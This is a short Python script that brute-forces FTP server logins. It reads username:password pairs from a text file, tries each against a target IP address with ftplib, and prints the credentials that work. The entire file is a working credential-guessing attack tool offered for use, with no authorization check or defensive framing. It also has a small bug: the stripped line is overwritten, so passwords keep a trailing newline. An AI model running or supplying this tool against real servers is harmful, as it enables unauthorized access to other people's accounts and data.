"""This python script bruteforces ftp server logins using usernames and passwords from the text file supplied.
The text file is structured as shown below:
username:password"""


import optparse
import ftplib

def bruteforceftp(hostaddress, username, password):
	try:
		ftp = ftplib.FTP(hostaddress)
		ftp.login(username, password)
	except:
		print('[-]Login failed.')
		print('Wrong_details: ' + username + ' : ' + password)
	else:
		print('[+]Login successful.')
		print('Login_details: '+ username + ' : ' + password)
		ftp.quit()
	

def main():
	parser = optparse.OptionParser('-a <ip_address> -f <username-password_file>')
	parser.add_option('-a', type='string', dest='ipaddress', help='Enter a valid ip address')
	parser.add_option('-f', type='string', dest='textfile', help='Enter the appropriate document')
	parser.usage = '[*]Run: python script.py -a <ip_address> -f <textfile>'
	(options, args) = parser.parse_args()
	if options.ipaddress == None or options.textfile == None:
		print(parser.usage)
		exit()
	else:
		ipaddress = options.ipaddress
		upfile = options.textfile
	
	content = open(upfile)
	for line in content.readlines():
		login_details = line.strip()
		login_details = line.split(':')
		
		bruteforceftp(ipaddress, login_details[0], login_details[1])
		
if __name__ == '__main__':
	main()
